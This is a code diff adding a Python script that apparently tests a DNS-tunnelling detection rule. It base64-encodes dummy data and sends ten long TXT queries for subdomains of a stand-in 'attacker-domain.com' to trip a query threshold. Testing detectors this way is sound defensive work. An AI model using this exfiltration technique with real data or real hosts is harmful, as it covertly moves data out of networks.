@@ -1,0 +1,26 @@
+import dns.resolver
+import base64
+import os
+import time
+
+# Simulated data to exfiltrate
+data_payload = "This_is_sensitive_data_being_exfiltrated_via_DNS_tunnelling_1234567890"
+encoded_data = base64.b64encode(data_payload.encode()).decode().rstrip("=")
+
+resolver = dns.resolver.Resolver()
+# Point resolver to a controlled/rogue DNS server if testing locally
+resolver.nameservers = ['192.168.1.20'] 
+
+# Generate 10 long TXT queries to trigger the 5-query threshold
+for i in range(10):
+    # Construct long subdomain: <encoded_data>.<random>.tunnel.attacker-domain.com
+    random_hex = os.urandom(8).hex()
+    query_domain = f"{encoded_data}.{random_hex}.tunnel.attacker-domain.com"
+    
+    try:
+        print(f"Querying: {query_domain} (Length: {len(query_domain)})")
+        answer = resolver.resolve(query_domain, "TXT")
+        print(f"Response: {answer}")
+    except Exception as e:
+        print(f"DNS Query failed (expected if server doesn't resolve): {e}")
+    time.sleep(2)
